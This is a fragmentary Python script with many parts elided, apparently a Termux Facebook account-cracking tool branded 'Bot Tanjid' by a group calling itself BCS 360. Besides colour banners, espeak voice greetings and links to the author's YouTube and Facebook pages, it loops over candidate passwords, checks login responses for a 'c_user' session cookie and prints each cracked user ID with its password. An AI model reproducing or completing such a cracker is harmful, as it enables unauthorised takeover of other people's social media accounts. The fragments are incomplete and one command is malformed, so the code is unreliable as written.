...
try:
    ...
    print('\x1b[1;92m[<\>]\x1b[1;97m \x1b[1;96TANJID')
...
for x in range(10):
    ...
    l='Mobile WVGA SMM-TANJID/1.2.0 OPN-B'
...
time.sleep(3)
os.system("pkg install espeak")
os.system('espeak -a 300 "Welcome to Bot Tanjid tool this tool created by bcs 360"')
print("\033[1;92m   [•] WELCOME TO BOT TANJID TOOL THIS TOOL CREATED BY BROKEN 360 \033[1;30m")
os.system('espeak -a 300 "Subscribe  My YouTube channel "')
print("\033[1;92m   [•] SUBSCRIBE MY YOUTUBE CHANNEL\033[1;30m")
os.system('xdg-open https://youtube.com/@tanjidcyberexport7113')
...
def banner():
    clear()
    print(f"""BBBBBBBBBBBBBBBBB           CCCCCCCCCCCCC   SSSSSSSSSSSSSSS 
B::::::::::::::::B       CCC::::::::::::C SS:::::::::::::::S
...
def main():
    ...
    if sh =='2':
       ...
       sh7()
    if sh =='3':
       os.system('xdg-https://www.facebook.com/BCS.Bangladesh.Cyber.Export.Official')
       main()  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\033[1;92m[TANJID-OK] '+uid+' | '+ps+'\033[0;97m')
                ...
                continue
        loop+=1
        animasi = random.choice(["\x1b[1;91TANJID","\x1b[1;92TANJID","\x1b[1;93TANJID","\x1b[1;94TANJID","\x1b[1;95TANJID","\x1b[1;96TANJID","\x1b[1;97TANJID","\x1b[1;91TANJID","\x1b[1;92TANJID","\x1b[1;93TANJID","\x1b[1;94TANJID","\x1b[1;95TANJID","\x1b[1;96TANJID"])
